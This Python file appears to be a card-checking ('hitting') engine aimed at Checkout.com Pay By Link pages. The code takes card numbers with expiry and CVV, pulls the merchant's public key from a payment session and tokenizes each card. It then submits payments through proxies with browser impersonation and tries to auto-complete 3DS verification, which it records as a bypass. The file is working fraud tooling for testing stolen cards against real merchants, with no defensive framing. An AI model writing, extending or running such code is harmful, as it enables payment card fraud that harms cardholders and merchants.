import re
import json
import time
import base64
import urllib.parse
from typing import Dict, Optional, Tuple
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

class CheckoutHitter:
    """Checkout.com Pay By Link (pay.checkout.com) hitting engine."""
    
    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url
        self.proxy_data = proxy_data
        self.session_id = self._extract_session_id(url)
        self.pk = None
        self.amount_str = None
        self.merchant_name = "Checkout.com Merchant"
        self._analyzed = False
        self.proxies = None
        
        if self.proxy_data:
            auth = f"{self.proxy_data['username']}:{self.proxy_data['password']}@" if 'username' in self.proxy_data else ""
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            self.proxies = {"http": purl, "https": purl}
            
    def _extract_session_id(self, url: str) -> Optional[str]:
        # Typical format: https://pay.checkout.com/page/12345abcde...
        m = re.search(r'page/([A-Za-z0-9_-]+)', url)
        if m: return m.group(1)
        m = re.search(r'([A-Za-z0-9_-]{20,})', url)
        return m.group(1) if m else None

    async def _analyze(self, session: ChromeSession) -> bool:
        if self._analyzed:
            return bool(self.pk)
            
        if not self.session_id:
            return False
            
        # Example API endpoint for hosted pages
        # pay.checkout.com might use api.checkout.com or its own domain
        api_url = f"https://pay.checkout.com/api/payment-sessions/{self.session_id}"
        
        headers = {
            "User-Agent": UA,
            "Accept": "application/json",
            "Referer": self.url
        }
        
        try:
            async with session.get(api_url, headers=headers, timeout=12) as r:
                if r.status_code == 200:
                    data = r.json() if callable(r.json) else r.json
                    
                    # Extract PK
                    self.pk = data.get('public_key') or data.get('publicKey')
                    
                    # Extract amount info
                    amount = data.get('amount')
                    currency = data.get('currency', 'USD')
                    if amount is not None:
                        # Checkout.com usually returns minor units
                        self.amount_str = f"{currency} {amount/100:.2f}"
                        
                    # Extract merchant info
                    merchant = data.get('merchant', {})
                    if isinstance(merchant, dict) and merchant.get('name'):
                        self.merchant_name = merchant['name']
                        
                    self._analyzed = True
                    return bool(self.pk)
        except Exception as e:
            print(f"Checkout.com analyze error: {e}")
            pass
            
        return False
        
    async def _tokenize(self, session: ChromeSession, card_obj: dict) -> Tuple[bool, Optional[str], Optional[str]]:
        """Return (success, token_id, error_msg)"""
        url = "https://api.checkout.com/tokens"
        headers = {
            "User-Agent": UA,
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": self.pk,
            "Origin": "https://pay.checkout.com",
            "Referer": "https://pay.checkout.com/"
        }
        
        payload = {
            "type": "card",
            "number": card_obj['card'],
            "expiry_month": int(card_obj['month']),
            "expiry_year": int(card_obj['year']),
            "cvv": card_obj['cvv']
        }
        
        try:
            async with session.post(url, json=payload, headers=headers, timeout=12) as r:
                data = r.json() if callable(r.json) else r.json
                if r.status_code in [200, 201] and 'token' in data:
                    return True, data['token'], None
                else:
                    return False, None, data.get('error_type') or data.get('message') or f"HTTP {r.status_code}"
        except Exception as e:
            return False, None, str(e)
            
    async def hit(self, card_str: str, index: int, user_id: int) -> dict:
        start_time = time.time()
        parts = card_str.split('|')
        c_obj = {'card': parts[0], 'month': parts[1], 'year': parts[2], 'cvv': parts[3]}
        
        result = {
            'success': False,
            'card': c_obj,
            'merchant': self.merchant_name,
            'amount': self.amount_str,
            'response_time': 0,
            'decline_code': None,
            'error': None,
            '3ds_bypassed': False
        }
        
        try:
            async with ChromeSession(impersonate="chrome131", proxies=self.proxies) as session:
                if not self._analyzed:
                    ok = await self._analyze(session)
                    if not ok:
                        result['error'] = "Failed to extract session or public key"
                        result['response_time'] = time.time() - start_time
                        return result
                        
                result['merchant'] = self.merchant_name
                result['amount'] = self.amount_str
                
                # 1. Tokenize
                tok_ok, token, tok_err = await self._tokenize(session, c_obj)
                if not tok_ok:
                    result['error'] = f"Tokenization failed: {tok_err}"
                    result['response_time'] = time.time() - start_time
                    return result
                    
                # 2. Submit Payment
                pay_url = f"https://pay.checkout.com/api/payment-sessions/{self.session_id}/payments"
                pay_headers = {
                    "User-Agent": UA,
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Referer": self.url
                }
                # Standard payload for pay.checkout.com token submission
                pay_payload = {
                    "token": token
                }
                
                async with session.post(pay_url, json=pay_payload, headers=pay_headers, timeout=15) as r:
                    pay_data = r.json() if callable(r.json) else r.json
                    
                    status = pay_data.get('status')
                    if status in ['Authorized', 'Captured', 'Success', 'Approved']:
                        result['success'] = True
                    elif status == 'Pending' and '_links' in pay_data and 'redirect' in pay_data['_links']:
                        # 3DS Challenge Flow
                        redir_url = pay_data['_links']['redirect']['href']
                        result = await self._handle_3ds(session, redir_url, result)
                    else:
                        result['decline_code'] = pay_data.get('response_code') or pay_data.get('response_summary') or status
                        result['error'] = pay_data.get('response_summary') or "Declined by issuing bank"
                        
        except Exception as e:
            result['error'] = f"Engine error: {str(e)}"
            
        result['response_time'] = time.time() - start_time
        return result

    async def _handle_3ds(self, session: ChromeSession, redirect_url: str, result: dict) -> dict:
        """Standard ACS redirect follow & completion."""
        try:
            # 1. GET Redirect page
            async with session.get(redirect_url, headers={"User-Agent": UA}, allow_redirects=True, timeout=12) as r:
                html = r.text() if callable(r.text) else r.text
                
            # 2. Parse ACS form
            acs_url = None
            form_data = {}
            m_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if m_action:
                acs_url = m_action.group(1)
            
            for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.I):
                form_data[m.group(1)] = m.group(2)
                
            if not acs_url or not form_data:
                result['error'] = "3DS Challenge Required (Hard OTP)"
                result['decline_code'] = "requires_action"
                return result
                
            # 3. POST to ACS
            async with session.post(
                acs_url, 
                data=urllib.parse.urlencode(form_data),
                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
                allow_redirects=True,
                timeout=15
            ) as r_acs:
                acs_html = r_acs.text() if callable(r_acs.text) else r_acs.text
                
            # 4. Parse return form and submit to merchant return URL
            ret_url = None
            ret_data = {}
            m_ret = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
            if m_ret:
                ret_url = m_ret.group(1)
                for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', acs_html, re.I):
                    ret_data[m.group(1)] = m.group(2)
                    
            if ret_url and ret_data:
                async with session.post(
                    ret_url,
                    data=urllib.parse.urlencode(ret_data),
                    headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
                    allow_redirects=True,
                    timeout=15
                ) as r_ret:
                    pass
                    
            # 5. Check session status again
            api_url = f"https://pay.checkout.com/api/payment-sessions/{self.session_id}"
            async with session.get(api_url, headers={"User-Agent": UA, "Accept": "application/json"}, timeout=10) as r_poll:
                poll_data = r_poll.json() if callable(r_poll.json) else r_poll.json
                final_status = poll_data.get('status')
                
                if final_status in ['Authorized', 'Captured', 'Success', 'Approved']:
                    result['success'] = True
                    result['3ds_bypassed'] = True
                else:
                    result['error'] = poll_data.get('response_summary') or f"3DS Failed / Status: {final_status}"
                    
        except Exception as e:
            result['error'] = f"3DS Bypass Error: {str(e)}"
            
        return result
